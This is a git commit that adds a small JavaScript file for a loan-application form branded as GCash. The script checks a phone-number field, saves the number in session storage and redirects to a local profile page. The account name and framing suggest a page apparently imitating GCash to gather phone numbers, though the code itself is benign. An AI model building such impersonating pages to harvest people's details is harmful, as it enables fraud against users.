939748bb320dc866ad7fe01f55d818d23284c6c4
gcash-loan-offer <161432044+gcash-loan-offer@users.noreply.github.com>
2024-02-27 09:00:28 +0100

    extended files
    Extended files

---
+++ javascript/loan.js
@@ -0,0 +1,27 @@
+
+// if(sessionStorage.getItem("loan")) {
+//     setTimeout(function() {
+//         window.location.assign("loan");
+//     }, 1000)
+// }
+function validateForm() {
+    if(document.forms["elementor-loan-form"]["tel-number-suffix"].value == "") {
+        document.querySelector(".error-msg").innerHTML = "*Fill in your phone number to apply";
+        return false;
+    } else {
+        sessionStorage.setItem("phone", document.forms["elementor-loan-form"]["tel-number-prefix"].value + " " + document.forms["elementor-loan-form"]["tel-number-suffix"].value);
+        if(sessionStorage.getItem("phone")) {
+            document.querySelector(".submit-button").classList.add("hide-display");
+            document.querySelector(".spinner-button").classList.remove("hide-display");
+            setTimeout(() => {
+                window.location.replace("http://localhost:4000/web/gcash/profile/");
+            }, 1000);
+        } else {
+            window.location.replace("http://localhost:4000/web/gcash/loan/");
+        }
+        return false;
+    }
+}
+function wipeError() {
+    document.querySelector(".error-msg").innerHTML = "";
+}
